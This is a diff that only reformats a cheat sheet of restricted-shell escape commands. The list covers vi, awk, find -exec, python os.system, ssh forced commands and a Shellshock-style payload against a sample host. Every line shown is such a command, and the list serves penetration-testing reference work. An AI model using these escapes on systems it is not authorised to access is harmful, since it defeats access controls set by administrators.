@@ -10,12 +10,16 @@ Escape from rbash / rsh / rksh
 !/bin/bash
 7) more / less / man
 !/bin/bash
-**8) vi / vim
-:!/bin/bash**
+_______________
+| 8) vi / vim |
+| :!/bin/bash |
+---------------
 9) awk 'BEGIN{system("/bin/bash")}'
 10) find / -name "test" -exec /bin/bash \;
 11) ssh guest@10.20.30.40 -t "/bin/bash"
-**12) ssh guest@10.20.30.40 -t "bash --noprofile"**
+___________________________________________________
+| 12) ssh guest@10.20.30.40 -t "bash --noprofile" |
+---------------------------------------------------
 13) ssh guest@10.20.30.40 -t "() { :; }; /bin/bash"
 14) echo "/bin/bash" | tee script.sh
 15) python -c 'import os; os.system("/bin/bash")'
